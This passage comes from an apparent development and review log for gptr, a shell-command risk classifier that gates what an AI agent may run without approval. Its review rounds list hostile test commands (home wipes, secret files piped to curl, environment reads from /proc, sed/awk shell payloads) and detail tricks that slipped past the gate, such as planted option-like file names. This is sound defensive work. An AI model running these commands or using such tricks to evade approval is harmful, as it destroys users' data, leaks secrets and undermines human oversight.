      1). `str.replace()` and `DataFrame.rename()` read as writes as well: Python is at least
      level 1, and the reading only rises.
    - *PCRE anchors.* With `perl = TRUE`, `$` also matches before a final newline, so a quoted
      word ending in a newline matched exact patterns: `echo x > "/dev/null<newline>"` wrote
      nothing (0), `git -c 'color.ui<newline>=x' log` was a safe key (0), and
      `python3 '--version<newline>'` and `make '-n<newline>'` were 0. Every end anchor of a PCRE
      pattern in `R/perm-classify.R` is now `\z` (null devices, top-level directories, the
      `$PWD`/`$OLDPWD` forms, git's safe, program-running and read keys and list/write options,
      every `has()` option pattern, the glob regular expressions of Task 1 and Task 2, sed's `s`
      command, awk's print targets, curl's and wget's sending and config options, SQL dollar
      quotes, MySQL comments and acting pragmas); the four lines are 3 and
      `risk_cmd_prog("ls\n")` is `?`. P03's `scan_secret_path_re` (`auth-secrets.R`, another
      plan's file) keeps its `$`, which only makes a secret-file match more likely.
16. **Review round 8 (findings against the standard).** Each finding was reproduced with a probe
    and judged by (A)-(C); all nine were accepted.
    - *Program paths.* `risk_cmd_prog()` keeps the last path component, so `./cat`, `bin/grep`,
      `../cat`, `~/bin/cat` and `/tmp/x/ls` read as the table's programs (0), though each runs
      whatever file is there (edits mode allows `cp /bin/sh ./cat` at 2). By
      `risk_cmd_trusted_prog()`, only a bare name (found on PATH; a PATH assignment is 3) or an
      absolute path with no `.` or `..` step and nothing the shell expands, outside the project,
      the home directory and the temporary directories (`tempdir()` and its parent,
      TMPDIR/TMP/TEMP, `/tmp`, `/var/tmp`, `/var/folders`, their `/private` forms, `/dev/shm`),
      runs the program its name says: `/bin/ls -la`, `/usr/bin/git status` and
      `C:\Git\bin\git.exe status` keep 0. Any other path is no wrapper and is read as an
      unknown program (3 `process`, call "not modelled: a program run from a path gptr does not
      know", with its guarded operands, command-line arguments and first later known program)
      and also by its name, so the level only rises: `./cat -c 'rm -rf ~'` and `bin/rm -rf ~`
      are 4, `build/ls`, `./time cat a.txt` and `env ./cat a.txt` 3; an argv is read the same.
    - *sed is parsed.* `risk_sed_parse()` reads the options as GNU sed (options anywhere,
      clusters, attached `-e`/`-f` values, unique long-option prefixes such as `--expr`,
      `--fil`, `--in-pl`, `-i[SUFFIX]`, `-l N`) and BSD sed (`-i`/`-I` with a suffix word such as
      `''` or `.bak`, `-l` without a value) read them; an unknown option or an ambiguous prefix
      is 3. `risk_sed_script()` reads the script (the `-e` texts joined with newlines) command by
      command: addresses (N, `first~step`, `$`, `/re/` and `\cREc` with I and M, `addr,+N`,
      `addr,~N`, `!`), bracket expressions in regular expressions (read as one item, as current
      GNU and BSD sed do; a second reading without them adds its effects when it parses), the
      `s` and `y` delimiters with escapes, blanks before `s` flags, labels that end at the first
      blank, `;` or `}` (GNU; BSD's label to the end of the line hides no command GNU reads), and
      `a`/`i`/`c` text and `r`/`R`/`w`/`W`/`e` arguments to the end of the line. Only `=`, `d`,
      `D`, `g`, `G`, `h`, `H`, `n`, `N`, `p`, `P`, `x`, `z`, `F`, `l`, `L`, `q`, `Q`, labels,
      `b`, `t`, `T`, `v`, `{`, `}`, comments, `a`/`i`/`c` text, `y` and `s` with the flags `g`,
      `p`, `i`, `I`, `m`, `M` and digits keep a line at 0; `w`, `W` and `s///w` write their file
      (its class's level), `r` and `R` read, `e` and `s///e` are 3 `dynamic` and the command line
      of `e CMD` is classified (`sed -n -e'1e rm -rf ~' f` 4). A command, address or delimiter
      the reader cannot read is 3 ("not modelled: a sed script gptr cannot read"), keeping what
      it read before (GNU sed opens `w` files while it reads the script). `sed -n` with
      `'s/a;b/c/w .Rprofile'`, `'/a;b/w .Rprofile'`, `'\%a%w .Rprofile'`,
      `'s/a/b/ w .Rprofile'`, `-e'w .Rprofile'`, `-ne'w .Rprofile'` or `--expr='w .Rprofile'` is
      4; `-fprog.sed`, `-nfprog.sed` and `--fil=prog.sed` are 3.
    - *awk is lexed.* `risk_awk_lex()` blanks string literals, regular expression literals and
      comments (positions kept) before the program is searched. A `/` starts a regular
      expression where an operand is expected (also after `print`, `printf`, `return`, `case`,
      `do`, `else`, `in`, `exit` and the `)` of an `if`, `while`, `for` or `switch` condition)
      and divides after an operand (`n++ / 1`); a string or regular expression that does not end
      on its line, or one whose end depends on reading a bracket expression as one item (awks
      differ), is 3 ("not modelled: an awk program gptr cannot read"). In the lexed text any `|`
      but `||` (pipes, gawk's `|&`), `system` and `@` (indirect calls, `@include`, `@load`,
      `@namespace`) are 3 `dynamic`. `risk_awk_files()` finds print and printf `>`/`>>` and
      getline `<` at parenthesis depth 0 before `;`, a newline, `}` or `|`: a target made of
      string literals (adjacent ones joined) takes its class, any other is a write gptr cannot
      name (3). `awk 'BEGIN { print "rm -rf ~;" | "sh" }'`, `print "}" | "sh"`, gawk's
      `@f("rm -rf ~")` and `@include "x.awk"` are 3; `awk '{print "a;b" > ".Rprofile"}' f` is 4.
    - *Long options by prefix and option clusters.* `risk_long_hit()` reads a word as a long
      option when it is any prefix of the name (git's parse-options and getopt_long() take a
      unique prefix and stop with an error at an ambiguous one, so reading a prefix as every
      option it may be misses nothing that runs); `risk_short_words()` gives the option
      clusters. git grep's `--open-files-in-pager` (`--open=`, `--op=`) and `-O` in a cluster
      are 3 and the pager's command line is classified (`git grep --open='rm -rf ~;' x` 4);
      git branch's and tag's write options count by prefix or as a cluster letter
      (`--edit-desc`, `--set-up=origin/x`, `--unset`, `-vd`: 2; `-vD` and `-d -f`, a forced
      delete: 3); `git help --we`/`-aw` 3; `date --se=` (`-s`/`--set` take their value),
      `hostname --fi=` or `-F` in a cluster, and `file --comp` read as their full forms.
    - *git remote, config and stash by verb* (`risk_git_verb()`; the old test asked whether any
      word looked like a read flag, so `git remote -v add evil URL` was 0). remote: no verb,
      `-v`, `get-url`, and `show` with `-n` or no name read (0); `show NAME`, `update` and
      `prune` contact the remote (2 `network`); every other verb writes (2). stash: `list` and
      `show` read; anything else writes, and a stash with options and no verb is a push whose
      pathspec after `--` is reset (`git stash -- .gptr/settings.json` 4, found in the
      self-review: it was 2). config: the `list` and `get` verbs, the `--get*`, `--list` and `-l`
      actions and a key alone read; the other verbs, the write actions (by prefix: `--ad`,
      `--unset`; `-e`) and a key with a value write (`git config user.name show` 2, was 0).
    - *External git subcommands.* A subcommand that is neither in `risk_git_builtins` (git's
      built-in subcommands that write no more than the repository; difftool, mergetool,
      credential, merge-index and send-email, which run configured tools or helpers, are left
      out) nor a row of the table is an external `git-<name>` program or an alias, perhaps
      `!cmd`: 3 `process` ("not modelled: an external git command or alias"). `git foo`,
      `git st`, `git x-evil` and `git lfs pull` are 3; `git commit -am wip` keeps 2.
    - *Environment variables are an allowlist.* `risk_env_inert_re` lists the names no program
      reads options, code, a file to load or a command line from: `LC_*`, `LANG`, `LANGUAGE`,
      `TZ`, `COLUMNS`, `LINES`, `TERM`, `NO_COLOR`, `CLICOLOR`, `CLICOLOR_FORCE`, `FORCE_COLOR`,
      `COLORTERM`, `LS_COLORS`, `LSCOLORS`, `GREP_COLOR`, `GREP_COLORS`, `TIME_STYLE`,
      `QUOTING_STYLE`, `BLOCK_SIZE`, `BLOCKSIZE`, `POSIXLY_CORRECT`, `GIT_TERMINAL_PROMPT`,
      `GIT_OPTIONAL_LOCKS`, `PYTHONUNBUFFERED`, `PYTHONDONTWRITEBYTECODE` and
      `PYTHONIOENCODING`. A prefix assignment of another name (`risk_cmd_inject_re`'s names keep
      their own handling) before a program outside `risk_cmd_inert` and `risk_env_quiet` (test,
      export, printf and other builtins that read no options from the environment) is 3
      `dynamic` ("not modelled: an environment variable the program may read options from":
      `RIPGREP_CONFIG_PATH=evil.rc rg foo`, `GIT_TRACE=out.txt git status`). A line runs in a
      shell of its own (03 section 6.7), so an export reaches only the later programs on it:
      after an export of such a name, or after a plain, for, readonly, local, declare or typeset
      assignment of such a name in upper case (the environment may export it already), every
      later program outside those lists is 3 (`risk_cmd_env_set()`;
      `export RIPGREP_CONFIG_PATH=evil.rc; rg foo` and `LESS=x; git log` are 3).
      `x=1; git status`, `DIR=src; ls $DIR`, `LC_ALL=C git status`, `FOO=1 cat f.txt` and
      `export X=~` keep their levels.
    - *jq and yq code gptr does not read.* `yq --from-file`, `jq -f`/`--from-file`, `jq -L` and
      `--library-path` (now options that take a value) and jq program text with
      `import "..."` or `include "..."` are 3 (`jq '.import' a.json` stays 0).
    - *Changed rows:* one, `export X=1; curl -o a.csv https://x.org/a.csv` 2 to 3 (`X` is no
      known-inert name and curl reads options from its environment, through CURL_HOME's
      `.curlrc`); the row's point, that the export's environment listing is no secret sent to
      the network (not 4), holds. One new expectation of mine was wrong before green:
      `sed -l 'w .x' f` is 2 (BSD sed reads `-l` without a value, so the script writes `.x`).
17. **Review round 9 (findings against the standard).** Each finding was reproduced with a probe
    (`task2-fix9-probe.log`) and judged by (A)-(C); three majors and one minor were accepted.
    - *A guarded name below a directory the shell computes (C).* P01 guards `.Rprofile`,
      `Rprofile.site`, `Renviron.site`, the `.gptr/` control files and `.git/hooks` by name in
      any directory, so `"$D/.Rprofile"` names a control file whatever `$D` holds, as
      `*/.Rprofile` already did; it was `unknown` (3) for writes and deletes.
      `risk_cmd_dyn_word()` reads such a word with each component that holds an expansion
      (`$NAME`, `${...}`, a substitution, `%NAME%`, `~login`) as one ordinary name (a run of them
      as one, since an expansion may hold `/`; a word that starts with one as absolute), and
      `risk_cmd_unknown_cwd()` gives the word the class P01 gives that reading by name (control,
      protected or instructions; a `.gptr` directory is control) over `unknown`; critical, which
      depends on where the directory is, never comes from it. Writes, deletes, links and the
      guarded operands of unmodelled programs go through it: `echo x >> "$R_HOME/etc/Rprofile.site"`,
      `cat > "$PROJ/.Rprofile" <<'EOF'`, `cp hook.sh "$REPO/.git/hooks/pre-commit"`,
      `echo x > "$D/.gptr/settings.json"`, `ln -s evil "$D/.Rprofile"`, `mv x "$D"/.Rprofile`,
      `touch $X/.Rprofile`, `echo x > .gptr/extensions/$F` and `rm -rf "$D/.gptr"` are 4, with
      the level and category of the literal word (`x/.Rprofile`, `x/.gptr`). A glob there takes
      the guarded names it can match, as item 15 reads a glob: `rm -rf "$D"/*` is 4 like
      `rm -rf build/*`, and `ls "$D"/*` 2 and `cat "$D"/*` 3 `secret` like `ls x/*` and
      `cat x/*` (`risk_cmd_read_class()`, `risk_cmd_secret_file()`); `cat "$D/renv.lock"` reads
      a protected file (2). A bare `"$X"`, a computed last name (`"$D/$F"`), a name joined to an
      expansion (`"$D.Rprofile"`), `"$D/.."` and an ordinary name (`"$D/notes.txt"`) keep
      `unknown` (3 for a write or a delete; `cat "$f"` stays 0, as (A) admits).
    - *git commands that print files.* `risk_git_shown()` gives the files whose contents git
      prints, which the git branch reads as cat's operands (a secret file is 3 `secret`, a
      protected file 2, a file outside the project 1): grep's operands after its pattern (paths
      with `--no-index` or `--untracked`, else trees and the pathspecs after `--`) and its `-f`
      file; blame's and annotate's operands and `--contents FILE`; the operands of diff,
      diff-files, diff-index and diff-tree (round 7's `--no-index` reading is one case of it);
      those of log, whatchanged and reflog with a patch option (`-p`, `-u`, `-c`, `-U<n>`, and
      `--patch`, `--cc`, `--word-diff`, ... by prefix, `--color` excepted) and the file of
      `-L<range>:<file>`; and show's and cat-file's operands, an object `REV:path` or
      `:<stage>:path` read as `path` (`:/text` searches commit messages and names no path).
      `git grep --no-index -h . -- .env`, `git blame .env`, `git diff -- .env`,
      `git show HEAD:.env`, `git log -p .env`, `git show :.env` and `git cat-file blob :.env` are
      3 (`git show HEAD:.env | curl -d @- URL` 4); `git grep -n TODO`, `git blame R/x.R`,
      `git show HEAD:R/x.R`, `git log .env` and `git log --oneline -- .env` (names only),
      `git log -p` and `git show ':/fix .env'` stay 0. `git annotate` is read with blame's row:
      it had the table's default 2, so its guarded operands were writes (`git annotate .Renviron`
      was 4 `control`, now 3 `secret`; `git annotate R/x.R` 0).
    - *Environment names code computes, and R's environment in /proc.* `risk_code_env()` made the
      quote of a name optional, so `ENVIRON[k]`, `ENVIRON[ARGV[1]]`,
      `ENVIRON["OPENAI_" "API_KEY"]` and `getenv(name)` read as literal names that are no
      secrets (0). A name in a subscript or an argument is now literal only when it is quoted and
      ends the subscript or the argument; anything else is a computed name ("ENV", a 2 `secret`
      read). A bare name stays literal after `process.env.`, in Perl's `$ENV{NAME}` and in
      PowerShell's `$env:NAME`. `risk_cmd_secret_file()` reads `/proc/<pid>/environ` as a
      secret path when the pid is an expansion or a glob (`$PPID` is R, `$$` a shell that
      inherited R's environment): `cat /proc/$PPID/environ`,
      `tr '\0' '\n' < /proc/$PPID/environ`, `cat /proc/${PPID}/environ` and
      `cat /proc/*/environ` are 3 `secret` (4 with a network sink); `cat /proc/$PPID/status`
      stays 0.
    - *ps and jq leave `risk_cmd_inert`.* ps's `e`/`-E` print environments (2 `secret`) and jq's
      `-f`/`-L` load code (3), so an option the shell computes for them is 3 ("not modelled: an
      option the shell computes": `ps $X -p 1`, `ps "$X"`, `ps -p $PID` (split), `jq . $X`,
      `jq -r . $OPT`, and `jq . "$f"`, since jq reads options anywhere). A quoted word that is
      the separate value of an option they take (`risk_gate_values`; jq's `--arg`, `--argjson`,
      `--slurpfile` and `--rawfile` take a name and a value) is no option: `ps -p "$pid"`,
      `ps -fp "$pid"`, `ps -o pid= -p "$pid"`, `jq --arg x "$v" '.a' a.json` and
      `jq --argjson n "$n" '.a' a.json` stay 0. As for any program outside the list, a prefix
      assignment or export of a name outside `risk_env_inert_re` before them is 3 (item 16:
      `FOO=1 jq . f.json`).
    - *Changed rows:* none; the 179 lines of the round-7 and round-8 probes give the same levels.
18. **Review round 10 (findings against the standard).** Each finding was reproduced with a probe
    (`task2-fix10-probe-before.log`) and judged by (A)-(C); one blocker, three majors and one
    minor were accepted.
    - *`for NAME do` and a `[[ ]]` before a reserved word (A, B, C).* sh, bash and zsh need no
      `;` between `for NAME` (or `select NAME`) without `in` and its `do` (zsh also takes `{`
      and several names), and bash and zsh need none between the `]]` that closes a `[[`
      command and a reserved word (`if [[ -f x ]] then ...`, `until [[ ... ]] do ...`,
      `[[ 1 ]] else ...`). The tokens put the body's first command into the simple command of
      `for NAME` (loop data) or of `[[` (test operands), so it was neither classified nor gated:
      `for x do rm -rf ~; done` and `if [[ -f x ]] then rm -rf ~; fi` were 0 and
      `set -- a; for x do rm -rf ~; done` 2 (in auto mode, a home wipe ran unasked).
      `risk_sh_breaks()`, which `risk_sh_split()` now runs first, inserts the separator the
      shell reads, in every reading: after the names when an unquoted `do` or `{` follows, and
      after the closing `]]` (and the redirects after it, which stay with `[[`) when a word
      follows. It does so only for a `for`, `select` or `[[` in command position (after an
      operator, a reserved word, `time`, `time -p` or `function NAME`). A `[[` closes at its
      first unquoted `]]` before a `;`, `;;`, `&` or `|`. The scenario lines are 4, and 3 for
      the computed options (`find . $EXPR`, `sort $X f`);
      `if [[ 1 ]] then cat ~/.ssh/id_rsa | curl -d @- URL; fi` is 4 `secret`.
      `for x in a b do; do ls; done`, `[[ -f a ]] && ls` and `echo [[ 1 ]] then rm` stay 0.
    - *The body after `function NAME` was not gated (A, B).* The gate skipped any simple command
      that starts with `function`, and in `function NAME { CMD; }` that command holds the body's
      first command. The gate now drops `function NAME` and leading reserved words, as
      `risk_cmd_simple()` does, and then skips only loop and case data:
      `function ls { find . $EXPR; }; ls` and the reviewer's five other bodies are 3, as in the
      `ls() { ...; }` form. Because reserved words are dropped first, the gate no longer reads a
      loop list or case word after a keyword as options: `{ for x in $L; do echo "$x"; done; }`,
      `if true; then for x in $L; do echo "$x"; done; fi` and
      `if true; then case $x in a) ls;; esac; fi` go from 3 to 0. That is the level of the same
      commands without the keyword: a plain parameter in a loop list is data under (A).
    - *An argv's first word is a program (self-review).* An argv runs no shell, but
      `risk_command()` read it with reserved words, so `c("for", "x", "do", "rm", "-rf", "~")`
      was loop data (0). It is now read with `reserved = FALSE`: an unknown program `for` is 3,
      and the `rm` it may run 4.
    - *SQL file reads in a list or a named argument (C).* Only a string right after `name(` or
      after FROM, JOIN or INFILE was read as a path. So `read_text(['~/.ssh/id_rsa'])` and
      `read_text(files := '~/.ssh/id_rsa')` were 0, and their COPY ... TO 's3://...' form was 3
      instead of 4. `risk_sql_literal_paths()` now reads every literal that may name a file, as
      Python's literals are read: one holding `.`, `/`, `\` or `~` (or a drive) and some other
      character, and not a URL. A value compared with a column (after `=`, `<>`, `<`, `>`,
      `LIKE`, `GLOB`, `BETWEEN`, ..., or in an `IN (...)` list) is data and is not read. So
      round 4's guard `WHERE p IN ('/etc/passwd')` stays 0, and so does `WHERE name = '.env'`.
      Two exceptions are read: a SET statement (`SET VARIABLE p = '~/.ssh/id_rsa'`) and a named
      argument written `name = 'v'` (DuckDB's table-function parameters). The list and named
      forms now give the scalar form's level (3 `secret`; the COPY form 4), and MySQL's
      double-quoted `LOAD_FILE("...")` is read too. `risk_sql_screen()` keeps the cost down.
      P01 classes a bare file name (no directory part, drive, expansion, glob or leading dot)
      read from the project as workspace (read level 0), unless P01 or P03 guard the name
      (`<name>.env`, renv.lock, secret names) or a file of that name exists (a link takes its
      target's class). Only those names are resolved on disk. A 20,000-row INSERT script with
      path-like values classifies in 1.0 s (18 s without the screen).
    - *Python writes to gptr's and R's environment (minor; IC-53 item 3).* gptr$py runs in R's
      process, so Python writing its environment is Sys.setenv() in R. IC-53 item 3 makes that
      level 4 `control` for GPTR_* and provider names, but Python's writes were 2 (an
      os.environ read) or 1 (putenv). `risk_py_env_writes()` reads:
      - assignments to `environ[NAME]` (augmented, chained, annotated, in a tuple) and
        `del environ[NAME]`;
      - environ's pop(), setdefault(), __setitem__(), __delitem__(), update() (dict keys,
        keyword arguments, pairs), `|=`, clear() and popitem();
      - putenv() and unsetenv();
      - the same forms through `environb`.

      A literal name of `risk_control_env` or `risk_control_env_re` is 4 `control`, and so is
      clear(). A name the code computes is 3 `dynamic`. Any other literal name is 2 `session`,
      as Sys.setenv() of it is. `risk_control_env` and `risk_control_env_re` are defined here
      with the values the plan gives in P11 Task 3, and Task 3 uses them as they are.
    - *Changed rows:* none of the 1,946 round-9 expectations changed. The 508 lines of the
      round-5 to round-9 probes give the levels the round-9 source gives. The gate lowers the
      three lines named above.
19. **Review round 11 (findings against the standard).** Both findings were reproduced with a
    probe (`task2-fix11-probe-before.log`) and judged by (A)-(C); one blocker and one major were
    accepted.
    - *A glob in an option position was read as a literal operand (A).* The shell expands an
      unquoted glob before the program reads its options, so a glob that can match a name
      starting with `-` hands the program whatever option a file in the directory is named. The
      gate read an unquoted `$X` in that position as a computed option, but not a glob, so 20
      lines were 0: `git log *.R`, `git log [-]*`, `git diff *.R`, `git show *.R`,
      `git grep foo *.R`, `find [-]*`, `find -*`, `find *.R`, `sed -n 1p *.txt`, `sort *.csv`,
      and `[-]*` after tree, less, file, rg, jq, yq, awk and fd. In a scratch repository a file
      named `--output=.Rprofile` made `git log [-]*` overwrite `.Rprofile`, and one named
      `-delete` made `find [-]*` delete the directory. Planting such a name is a level-2
      workspace write, which edits mode approves without asking. The tokens now carry each
      word's glob pattern (`glob`, from risk_sh_tokens() through risk_sh_breaks() and
      risk_sh_split(); quoted and escaped characters are literal, risk_sh_brace() returns
      each brace word's quote flags, and a brace expansion too long to list reads each group
      as `*`). `risk_glob_dash()` decides whether the pattern can match a
      name starting with `-`: its first character is `-` (quoted or not), `*` or `?`, or a
      bracket expression that matches `-` (`[-]`, `[!.]`, `[^a]`, `[+-.]`, `[[:punct:]]`; a
      collating element gptr cannot read counts as a match). For a program outside
      `risk_cmd_inert`, such a glob before a literal `--` is "an option the shell computes" (3
      `dynamic`). In find's words it is that wherever it stands, since find reads every word
      as a starting point or an expression. A glob in a wrapper's words (`nice -n x* ls`,
      `timeout x* ls`, `env -u * ls`) may expand to several words and so change the command
      that runs; it is "a wrapper option the shell computes", and a glob command name is "a
      command name the shell computes". `[`/`test` read a glob that can match `-v` as the
      arithmetic test (`[ * ]`), and printf a first word that can start with `-` as
      `printf -v`. The guard rows stay 0: inert programs (`ls *.md`, `cat *.csv`,
      `grep foo *.R`, `wc -l *.csv`, `head *.csv`), globs after `--` (`git log -- *.R`), globs
      whose first character is a literal other than `-` (`git log R/*.R`, `./*.R`, `a[-]*`),
      brackets that cannot match `-` (`[a-z]*`, `[.]*`, `[[:alpha:]]*`, `[!-]*`, `[]]*`),
      quoted and escaped globs (`find . -name '*.R'`, `git log \*.R`), `[[ -f *.R ]]` and
      here-strings (no pathname expansion there). Self-review raised the wrapper lines, which
      were 0 in round 10.
    - *uniq and xxd write a glob's second name (A).* Both take `[input [output]]`, and a glob
      input may expand to two names, so `uniq *.txt` overwrote the second matching file at
      level 0. A uniq or xxd input that holds a glob character is now also written, with the
      glob's target class (risk_cmd_target_class(), as for the targets of tee and cp): 2 for
      `uniq R/*.txt`, `xxd data/*.bin` and `uniq -c -- *.txt`, 4 `control` for `uniq .Rprof*`
      and `xxd .gptr/*`. `uniq *.txt` and `xxd *.bin` are 3, since the gate also reads them.
    - *Changed rows:* one assertion in an older block. `rm -rf ?*` gains the gate's `dynamic`
      row (still 4), so its critical delete row is now selected by category before its path
      class is compared. No old level changed. Among probe lines that are not test rows, programs
      outside `risk_cmd_inert` with a leading glob go from 2 to 3, so edits mode now asks before
      running them: `cp *.txt out/`, `touch *.txt`, `tee *.log`, `chmod +x *.sh`, `git add *.R`
      and `git checkout *.R`. `cp R/*.R out/`, `cp -- *.txt out/` and `touch -- *.txt` stay 2.
20. **Review round 12 (findings against the standard).** Both findings were reproduced with a
    probe (`task2-fix12-probe-before.log`: each of the reviewer's lines was 0) and judged by
    (A)-(C); one blocker and one major were accepted.
    - *A glob moves the words after it (A, B).* A glob expands to every name it matches, so its
      later names and the words after it move on by as many. Round 11 read that only where a
      name can start with `-`. A glob at or before awk, gawk, sed, jq or yq program text
      (`awk a* x.txt`, `gawk -v x=a* '{print x}' data.txt`, `jq --arg n a* .x f.json`,
      `yq e a* x.yaml`), in git's global options or as git's subcommand (`git -C r* log`,
      `git --git-dir a* log`) was 0, while the `$` forms were 3. With one planted name (a
      level-2 write), the reviewer ran a shell command through `awk a* x.txt` and the gawk
      line, deleted a tracked file through `git -C r* log` (`git -C r rm log`) and printed the
      environment through `jq a* f.json`. The gate now reads a glob at or before the last
      program-text word (risk_cmd_code_at()) as "a program text the shell computes", and one in
      git's global options (`risk_git_global_values` lists those that take the next word) or
      subcommand as "a git subcommand the shell computes" (3 `dynamic`). Self-review applied
      the reading wherever gptr decides a level from a word's position: a glob among the words
      of a git subcommand gptr reads by its verb (`risk_git_verb_subs`: config, reflog, bisect
      and submodule before `--`, the verb of remote and stash) is "a git verb the shell
      computes" (`git config c*` may set `core.pager`); a glob among ps's words (BSD option
      letters: `ps x*` may expand to `xe`, which prints environments) or date's (a digit
      operand sets the clock) is a computed option, and so is one that can match a name
      starting with `+` for less and more (`less [+]*` may run `+!cmd`; risk_glob_dash() takes
      the leading character). A program-text option without its value (`sed -e`) stopped the
      gate with an error on the round-11 source; risk_cmd_code_at() now names no word for it.
    - *A glob pattern or option value hands the program its names as files (C).*
      `grep .env* x.txt` and `grep -e .R* x.txt` were 0, although bash runs
      `grep -e .env .env.local x.txt`, which reads `.env.local`; as an operand the same glob
      was 3 `secret`. risk_cmd_walk() now hands risk_cmd_simple() the words that are unquoted
      globs (attribute `globs`; in a reading made from a variable's value or a link's source,
      each unquoted word with a glob character), and risk_cmd_shifted() returns, when a glob is
      no operand (a pattern or an option value, not a long option's value after `=`), that glob
      and every later word that is no option. The read programs read them with their read
      class (grep, egrep, fgrep, rg, ag, head, cut, diff and the other programs of the generic
      read branch, sort, fd, tree, and git grep, blame, diff, show and log -p): `grep .env*
      x.txt`, `rg -g .env* foo`, `diff -L .env* a` and `git grep -e .env* x` are 3 `secret`,
      and `grep -A 1* .env x` reads `.env` (3). uniq and xxd write them (`uniq -f 1* in.txt` is
      2, `uniq -f 1* .Rprofile` 4 `control`), and read their glob input from the attribute, so
      a quoted glob is a name (`uniq 'a*' out.txt` is 2, was 3; round 11's known limit is
      gone). risk_sh_glob_pat() marks a bracket expression live only with a `]` after its first
      member, as risk_glob_rx() and the shell read it, so `jq .[] x.json` stays 0 while
      `jq .[0] x.json` is 3. The guard rows stay 0: `awk '{print $1}' R/*.csv`,
      `jq . R/*.json`, `git log R/*.R`, `git -C sub/dir log`, `grep 'a.*b' x.txt`,
      `grep foo *.R`, `grep [Tt]odo notes.txt`, `grep -rn --include=*.R .Renviron R/`,
      `git tag -l v1.*`, `git config --get user.name`, `ps aux`, `date +%s`; and
      `git stash push -- R/*.R` stays 2.
    - *Changed rows:* none in older blocks. The 528 lines of the round-5 to round-11 probes
      give the same levels and categories. Among this round's probe lines, 55 are higher and one
      is lower (`uniq 'a*' x`, 3 to 2). Raised outside the tests: unquoted program text with a
      glob character (`sed -n s/a*/b/p x`, `jq .[0] x.json`, `jq .a? x.json`) is 3.
21. **Review round 13 (findings against the standard).** All four findings were reproduced with
    a probe (`task2-fix13-probe-before.log`: each of the reviewer's lines was at the level the
    reviewer gives) and judged by (A)-(C); two blockers and two majors were accepted.
    - *awk's `-W` options (A).* gawk reads `-W NAME[=VALUE]` and `-WNAME` as `--NAME` (getopt's
      `W;`, with a unique prefix), and mawk's `-W exec FILE` reads the program from FILE; gptr
      read `-W` as a plain flag, so `gawk -W source 'BEGIN{system("id")}'`, `gawk -W exec x.awk`,
      `gawk -Wexec x.awk`, `gawk -W load ./x 'BEGIN{}'` and `awk -W exec x.awk` were 0, and
      `gawk -W source 'BEGIN{print 1 > ".Rprofile"}'` was 0, not 4. risk_awk_w() now gives
      gawk's reading (a value-taking long option takes the next word without `=`; option
      letters before `W` stay; an option's value is no option, so `awk -F -W` sets FS), and
      risk_awk_readings() adds the words as they are for `awk`, because the one-true-awk
      (macOS) ignores `-W` and runs the next word: `awk -W 'assign=1;BEGIN{system("id")}'`
      runs `id` there. The awk branch and risk_cmd_code_at() read both readings (code_at maps
      the indices back), and a -W name gawk does not know or that begins several (mawk's
      `interactive`, `sprintf=`, gawk's ambiguous `f`) is "an awk -W option gptr does not read"
      (3). The awk option lists became the constants `risk_awk_values` and
      `risk_awk_optional`. `gawk -W version`, `gawk -W lint '{print}' x` and
      `gawk -W posix '{print $1}' x.txt` stay 0.
    - *Files a list names (B; C for a secret list).* `sort --files0-from=F` sorts and prints the
      files F names, and sort, wc, du, file (`-f`, `--files-from`), find (`-files0-from`) and
      tree (`--fromfile`, `--fromtabfile`) print F's lines in their errors or listing (each was
      run on a fake secret here). `sort --files0-from=list.txt` was 0, `sort --files0-from=.env`
      0, and the wc, du, file and tree lines with `.env` 2 (a protected read without its
      contents). sort's `--files0-from` (any prefix gptr reads, and `-` for standard input) is
      now "files a list names, which gptr does not read" (3), and its value is read with its
      contents; risk_cmd_name_lists() names the list files of wc, du, file and find, read with
      their contents, and tree reads its operands with their contents under `--fromfile`. A
      secret list is 3 `secret`; `wc --files0-from=list.txt`, `file -f list.txt` and
      `find -files0-from list.txt` stay 0 (they print names and counts of the files listed).
    - *xxd's and uniq's option words (C).* xxd strips one `-` from `--NAME`, matches options
      by their first letter, and its -c, -g, -l, -n, -o, -s and -R take the next word when
      nothing follows the letter or the rest begins the long name (`-cols`, `-group`, `-len`,
      `-name`, `-offset`, `-seek`, `-skip`); options end at the first other word. gptr knew
      only the exact words, so `xxd --cols 16 a.bin .Rprofile`, `xxd -skip 4 ...`,
      `xxd -lenx 4 ...` and six more wrote `a.bin` at 2 instead of `.Rprofile` at 4.
      risk_xxd_ops() now reads the operands as xxd does (checked against /usr/bin/xxd
      2025-08-24). BSD uniq reads `+N` as -s N, GNU uniq as its input: every uniq and xxd
      operand after the first is written, and the second operand after a `+N` is read, so
      `uniq +3 a.txt .Rprofile` is 4 `control` and `uniq +3 a.txt` 2 (GNU writes `a.txt`).
    - *yq's flags (A).* `-f`/`--front-matter`, the `--xml-*`, `--csv-separator`,
      `--properties-separator`, `--shell-key-separator`, `--lua-prefix`, `--lua-suffix`,
      `--ini-key-value-delimiters` and `--split-exp-file` take a value; gptr read them as
      flags and their value as the expression, so `yq -f process 'load_str(".env")' x.md` and
      `yq --csv-separator x 'load_str(".env")' x.csv` were 0. `risk_yq_values` and
      `risk_yq_flags` now list every flag of yq v4's root command, used by the yq branch and by
      risk_cmd_code_at(); risk_yq_words() drops a short flag's `=value` (`-r=false`), as pflag
      reads it. Fail-safe additions: a flag outside both lists (a later yq's, python yq's) is
      "a yq option gptr does not know" (3); a `-f` value other than `extract` or `process`
      (python yq's program file) is "a yq program file"; `--split-exp-file` is "a yq split
      expression file" with a 3 `file_write` to an unknown name; and
      `--security-enable-system-operator` is "the yq system operator" (it lets the expression
      run commands).
    - *Self-review.* With `--expression`, every yq operand is a file, but gptr skipped the first:
      `yq --expression .a .env` was 0 and `yq -i --expression '.a = 1' .gptr/settings.json` 2.
      They are 3 `secret` and 4 `control`.
    - *Changed rows:* none in older blocks. The 697 lines of the round-5 to round-12 probes give
      the same levels and categories. Of this round's 159 probe lines, 79 are higher and 4 are
      lower, each a false positive of round 12: `xxd -cols4 a.bin .Rprofile` (xxd takes `a.bin`
      as the column count and writes nothing, 4 to 0), `xxd --cols 16 a.bin` (2 to 0),
      `yq -r=false '.a' x.yaml` (3 to 0) and `yq -Pi=false '.a' x.yaml` (3 to 2, `-i=false` is
      still read as -i). Raised outside the tests: a yq flag gptr does not list is 3.
22. **Review round 14 (findings against the standard).** The finding was reproduced with a probe
    (`task2-fix14-probe-before.log`: each of the reviewer's lines was 0) and on fake data in the
    scratchpad (a planted name `--files0-from=fake.env` made GNU coreutils' `gwc -l -*` and
    `gdu -sh -*` print the fake secret in their errors, and `-ffake.env` made the macOS grep's
